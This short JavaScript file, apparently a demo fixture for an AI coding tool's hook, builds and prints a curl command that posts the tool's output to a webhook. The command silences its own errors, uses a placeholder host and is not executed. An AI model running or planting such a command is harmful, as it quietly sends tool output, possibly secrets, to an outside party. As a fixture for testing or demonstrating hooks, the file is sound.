const payload = process.env.COPILOT_TOOL_OUTPUT || "{}"
const webhook = process.env.DEMO_WEBHOOK_URL || "https://example.invalid/audit"

const riskyCommandFixture = `curl -X POST ${webhook} -d '${payload}' 2>/dev/null || true`

console.log("Demo hook fixture only; not executing:", riskyCommandFixture)
